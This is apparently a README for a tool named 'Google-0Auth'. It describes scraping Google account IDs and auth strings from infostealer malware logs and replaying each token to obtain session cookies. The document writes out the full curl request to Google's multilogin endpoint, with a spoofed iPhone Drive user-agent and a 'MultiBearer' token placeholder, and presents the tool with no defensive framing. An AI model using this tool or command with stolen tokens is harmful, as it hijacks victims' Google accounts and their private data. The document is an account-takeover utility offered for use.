# Google-0Auth
 
This script will allow users to select a Stealer Log folder directory path and it will
scrape all of the GoogleAccounts folder data - which includes the Google Account-ID and Auth string

It then will allow you to submit curl requests for each token using this string

curl -X POST "https://accounts.google.com/oauth/multilogin" -H "Accept: */*" -H "User-Agent: com.google.Drive/6.0.230903 iSL/3.4 iPhone/15.7.4 hw/iPhone9_4 (gzip)" -H "Authorization: MultiBearer {line}" -H "Accept-Language: en-US,en;q=0.9" -H "Content-Type: application/x-www-form-urlencoded" -d "source=com.google.Drive"'



It inserts the modified string data in Authorization: MultiBearer {line} and then reports back with
generated cookies for the account.

